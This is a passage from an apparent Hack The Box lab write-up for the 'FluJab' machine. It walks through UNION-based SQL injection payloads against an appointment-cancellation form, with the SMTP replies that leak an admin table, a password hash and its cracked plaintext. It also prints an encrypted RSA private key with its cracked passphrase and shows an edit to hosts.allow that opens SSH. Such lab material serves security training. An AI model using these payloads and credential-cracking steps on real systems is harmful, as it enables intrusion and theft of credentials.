&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:28:15 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:admin
Message-ID: &amp;lt;e389b6f96e0104edf7b12bd167666fb3@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--                              
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;table-name-is-admin-lets-get-the-column-names-&quot;&gt;Table name is &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; let’s get the column names :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--3&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:38:55 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:id
Message-ID: &amp;lt;50be6357006cbedc546152de64cd5407@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--     
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-gave-us-the-first-column-name-which-is-id-to-get-the-rest-of-the-column-names-we-will-add-and-column_nameprevious-column-name-here&quot;&gt;This gave us the first column name which is &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt;, to get the rest of the column names we will add &lt;code class=&quot;highlighter-rouge&quot;&gt;and column_name!='PREVIOUS COLUMN NAME HERE'&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--4&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:41:26 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:loginname
Message-ID: &amp;lt;3d6a306c2827c5d6b3e44ae2c9602d2e@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;second-column--loginname&quot;&gt;Second column : &lt;code class=&quot;highlighter-rouge&quot;&gt;loginname&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--5&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:44:08 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:namelc
Message-ID: &amp;lt;8a8dbbfb4a4c3a0968c819bc9e188e6c@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;third-column--namelc&quot;&gt;Third column : &lt;code class=&quot;highlighter-rouge&quot;&gt;namelc&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--6&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:46:45 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:email
Message-ID: &amp;lt;087443e0a9489da3ec320a89cc3df41b@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--                                                                    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;fourth-column--email&quot;&gt;Fourth column : &lt;code class=&quot;highlighter-rouge&quot;&gt;email&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--7&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:48:47 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:access
Message-ID: &amp;lt;f2306132c2238cf545023e952591045d@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--                                           
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;fifth-column--access&quot;&gt;Fifth column : &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-stopped-right-there-to-see-if-thats-enough-lets-see-what-data-can-we-get-from-these-columns&quot;&gt;I stopped right there to see if that’s enough, let’s see what data can we get from these columns.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--8&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 16:01:53 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:sysadm:administrator:syadmin@flujab.htb:sysadmin-console-01.flujab.htb                                  
Message-ID: &amp;lt;547797c2649862cadc98c5c5e345208b@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#                                          
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-a-login-name-an-email-address-and-a-link-to-a-sysadmin-console-but-we-still-need-a-password-i-dont-know-if-i-had-to-enumerate-more-until-i-get-the-column-password-but-anyway-i-just-added-password-hoping-that-theres-a-column-called-password-and-i-was-right-&quot;&gt;We got a login name, an email address and a link to a sysadmin console. But we still need a password. I don’t know if I had to enumerate more until I get the column &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; but anyway I just added password hoping that there’s a column called password, and I was right :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--9&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 16:03:22 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:sysadm:administrator:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:syadmin@flujab.htb:sysadmin-console-01.flujab.htb
Message-ID: &amp;lt;783cf28dd5b1c56f309b9a45724c5ec5@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#                             
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-take-a-look-at-what-we-have-&quot;&gt;let’s take a look at what we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-is-a-sha256-hash-i-used-crackstation-to-crack-it-&quot;&gt;Password is a &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256&lt;/code&gt; hash. I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password--th3doct0r&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;th3doct0r&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-added-sysadmin-console-01flujabhtb-to-etchosts-then-i-went-to-httpsysadmin-console-01flujabhtb-&quot;&gt;I added &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin-console-01.flujab.htb&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; then I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sysadmin-console-01.flujab.htb/&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/81.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/82.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-got-the-direct-ip-access-error-again-but-this-time-on-port-8080-i-didnt-get-the-same-error-&quot;&gt;I got the direct ip access error again. But this time on port 8080 I didn’t get the same error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/83.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/84.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;ajenti-administration-panel-note--it-wont-be-accessible-if-your-ip-wasnt-in-the-whitelist&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel. (Note : It won’t be accessible if your ip wasn’t in the whitelist)&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;cve-2008-0166-user-flag&quot;&gt;CVE-2008-0166, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-in-the-first-thing-i-noticed-was-the-notepad-&quot;&gt;After getting in the first thing I noticed was the notepad :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/85.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/86.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/87.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nice-so-we-can-read-and-write-some-stuff-on-the-server-i-checked-the-home-directory-and-it-had-a-lot-of-users-with-a-lot-of-user-flags-&quot;&gt;Nice so we can read and write some stuff on the server. I checked the home directory and it had a lot of users with a lot of user flags ….&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/88.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;for-example-&quot;&gt;For example :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/89.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/90.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-one-user-called-drno-had-ssh-directory-with-a-key-in-it&quot;&gt;But one user called &lt;code class=&quot;highlighter-rouge&quot;&gt;drno&lt;/code&gt; had &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; directory with a key in it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/91.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/92.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/93.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;userkey-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;userkey&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B

zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;unfortunately-it-was-encrypted-so-i-used-ssh2john-then-i-cracked-it-&quot;&gt;Unfortunately it was encrypted so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh2john&lt;/code&gt; then I cracked it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/94.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/95.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password--shadowtroll&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;shadowtroll&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;chmod-600-drnokey-then-i-used-the-key-to-ssh-as-drno-and-we-got-the-user-flag-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600 drno.key&lt;/code&gt;, then I used the key to ssh as &lt;code class=&quot;highlighter-rouge&quot;&gt;drno&lt;/code&gt; and we got the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nope-we-only-got-a-connection-reset-i-went-back-to-the-administration-panel-and-took-a-look-at-etchostsallow-&quot;&gt;Nope we only got a connection reset. I went back to the administration panel and took a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts.allow&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/97.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-added-my-ip-address-and-tried-again-&quot;&gt;I added my ip address and tried again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/98.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/99.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;still-a-connection-reset-i-went-back-and-added-sshd--all&quot;&gt;Still a connection reset. I went back and added &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd : ALL&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/100.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/101.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-but-now-it-doesnt-accept-the-key-it-was-just-a-troll-anyway-we-got-the-public-key-in-authorized_keys-&quot;&gt;It worked but now it doesn’t accept the key. It was just a troll. Anyway we got the public key in &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; :&lt;/h4&gt;
